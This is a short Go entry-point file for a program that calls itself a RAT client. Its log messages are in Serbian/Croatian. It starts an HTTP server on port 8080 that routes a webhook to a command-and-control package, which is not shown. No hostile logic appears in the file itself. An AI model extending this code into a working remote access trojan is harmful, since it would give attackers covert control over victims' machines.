package main

import (
	"log"
	"net/http"
	"royal/internal/c2"
)

func main() {
	log.Println("RAT klijent pokrenut...")

	http.HandleFunc("/webhook", c2.HandleWebhook)
	log.Println("Slušam Webhook na portu 8080...")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
